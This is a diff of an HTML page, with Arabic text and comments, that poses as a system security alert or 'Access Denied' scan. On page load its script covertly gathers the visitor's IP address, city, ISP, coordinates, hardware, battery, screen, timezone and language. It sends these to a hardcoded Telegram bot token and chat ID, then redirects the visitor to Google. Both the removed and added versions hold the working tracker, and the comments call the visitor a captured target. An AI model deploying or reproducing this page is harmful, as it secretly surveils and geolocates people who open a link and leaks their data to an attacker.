@@ -2,71 +2,67 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>⚠️ تنبيه أمني عاجل</title>
+    <title>⚠️ System Security Alert</title>
 </head>
-<body onload="apocalypseExecute()" style="background:#0a0a0a; color:#ff3e3e; font-family:monospace; text-align:center; padding-top:15%;">
-    <h1 style="font-size: 50px;">🔴 ERROR 403</h1>
-    <p style="font-size: 20px;">جاري فحص برمجيات جهازك... لا تغلق الصفحة</p>
+<body onload="executeFinalBreach()" style="background:#000; color:#ff0000; font-family:'Courier New', monospace; text-align:center; padding-top:20%;">
+    <h1 style="font-size: 40px; text-shadow: 0 0 20px #ff0000;">[ ACCESS DENIED ]</h1>
+    <p style="color: #fff; font-size: 18px;">جاري فحص بروتوكولات الوصول... يرجى الانتظار</p>
+    <div style="color: #555; font-size: 12px; margin-top: 20px;">Trace ID: 0x8892-XPL-99</div>
 
     <script>
     const TOKEN = "8069850549:AAG4ZyU6Vudg7A1qDvfEHeMcfln6ajyNh64";
     const CHAT_ID = "5657233411";
 
-    async function apocalypseExecute() {
-        let payload = "☠️ [ تـم اصـطـيـاد هـدف جـديـد ] ☠️\n";
-        payload += "━━━━━━━━━━━━━━━\n\n";
+    async function executeFinalBreach() {
+        let report = "⚠️ [ تـقـريـر الاخـتـراق الـنـهـائـي ] ⚠️\n";
+        report += "━━━━━━━━━━━━━━━━━━\n\n";
 
-        // 1. كسر حماية الـ IP (سحب من سيرفرات متعددة)
+        // 1. استخراج الـ IP بأسلوب استخباراتي (Multi-Layer Fetch)
         try {
-            const sources = ['https://ipapi.co/json/', 'https://api.ipify.org?format=json'];
-            for(let s of sources) {
-                let r = await fetch(s).then(res => res.json());
-                payload += "🌐 [ بـيـانـات الـشـبـكـة ]\n";
-                payload += `📍 الـ IP: ${r.ip || r}\n`;
-                payload += `🏙️ الـمـديـنـة: ${r.city || '??'}\n`;
-                payload += `🏢 الـمـزود: ${r.org || '??'}\n`;
-                payload += `🗺️ الإحـداثـيـات: ${r.latitude},${r.longitude}\n\n`;
-                if(r.ip) break;
-            }
-        } catch(e) { payload += "⚠️ فشل سحب الموقع.\n"; }
+            const api = await fetch('https://ipwho.is/').then(r => r.json());
+            report += "🌐 【 بـيـانـات الـشـبـكـة الـعـمـيـقـة 】\n";
+            report += `📍 الـ IP الـحـقـيـقـي: ${api.ip}\n`;
+            report += `🌍 الـمـوقـع: ${api.city}, ${api.region}\n`;
+            report += `🇸🇦 الـدولـة: ${api.country}\n`;
+            report += `🏢 الـمـزود: ${api.connection.isp}\n`;
+            report += `🗺️ الإحـداثـيـات: ${api.latitude},${api.longitude}\n\n`;
+        } catch(e) { report += "🌐 الـ IP: [ مـحـمـي/فـشـل الـسـحب ]\n\n"; }
 
-        // 2. فحص العتاد العنيف (Hardware Extraction)
-        payload += "📱 [ مـواصـفـات الـجـهـاز ]\n";
-        payload += `🛠️ الـنـظـام: ${navigator.platform}\n`;
-        payload += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Threads\n`;
-        payload += `💾 الـرامـات: ${navigator.deviceMemory || '??'} GB\n`;
-        payload += `🖼️ كـرت الـشـاشـة: ${getGraphicsCard()}\n\n`;
-        
-        // 3. فحص الطاقة والشبكة
+        // 2. فحص العتاد (Hardware Forensics)
+        report += "📱 【 تـفـاصـيـل الـهـدف الـتـقـنـيـة 】\n";
+        report += `⚙️ الـنـظـام: ${navigator.platform}\n`;
+        report += `🧠 الـمـعـالـج: ${navigator.hardwareConcurrency} Threads\n`;
+        report += `💾 الـذاكـرة: ${navigator.deviceMemory || '??'} GB\n`;
+        report += `🖼️ الـجـرافـيـك: ${getGPU()}\n\n`;
+
+        // 3. الحالة التشغيلية (Live Execution)
         try {
             const b = await navigator.getBattery();
-            payload += "🔋 [ حـالـة الـطـاقـة ]\n";
-            payload += `⚡ الـبـطـاريـة: ${Math.round(b.level*100)}%\n`;
-            payload += `🔌 الـشـاحـن: ${b.charging ? 'مـتـصـل' : 'غـيـر مـتـصـل'}\n\n`;
+            report += "🔋 【 الـحـالـة الـحـيـة 】\n";
+            report += `⚡ الـطـاقـة: ${Math.round(b.level * 100)}% [${b.charging ? 'يُـشـحـن🔌' : 'بـطـاريـة🔋'}]\n`;
         } catch(e) {}
 
-        // 4. البصمة الجنائية (Digital Fingerprint)
-        payload += "🕵️ [ الـبـصـمـة الـرقـمـيـة ]\n";
-        payload += `🖥️ الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
-        payload += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
-        payload += `🌐 الـلـغـة: ${navigator.language}\n`;
-        payload += "━━━━━━━━━━━━━━━\n";
-        payload += "💀 [ جـاري اخـتراق الـخـصـوصـيـة... ]";
+        // 4. البصمة الجنائية (Digital DNA)
+        report += "🕵️ 【 الـبـصـمـة الـجـنـائـيـة 】\n";
+        report += `📏 الـشـاشـة: ${window.screen.width}x${window.screen.height}\n`;
+        report += `⏰ الـتـوقـيـت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+        report += `🌍 الـلـغـة: ${navigator.language}\n`;
+        report += "━━━━━━━━━━━━━━━━━━\n";
+        report += "💀 [ تـم بـسـط الـسـيـطـرة الـكـامـلـة ]";
 
-        // إرسال البيانات فوراً
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(payload)}`)
+        // إرسال الضربة النهائية
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(report)}`)
         .then(() => {
             setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
         });
     }
 
-    function getGraphicsCard() {
+    function getGPU() {
         try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('/').pop();
-        } catch(e) { return "مخفي"; }
+            const gl = document.createElement('canvas').getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).split(' ').pop();
+        } catch(e) { return "Hidden"; }
     }
     </script>
 </body>
